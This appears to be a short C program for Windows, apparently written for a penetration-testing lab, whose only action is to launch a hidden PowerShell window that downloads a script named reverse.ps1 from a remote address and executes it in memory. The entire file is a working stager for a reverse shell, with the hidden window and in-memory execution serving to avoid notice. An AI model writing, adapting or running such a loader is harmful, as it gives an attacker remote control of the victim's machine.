
#include <windows.h>

int main() {
    system("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.14:4444/reverse.ps1')\"");
    return 0;
}
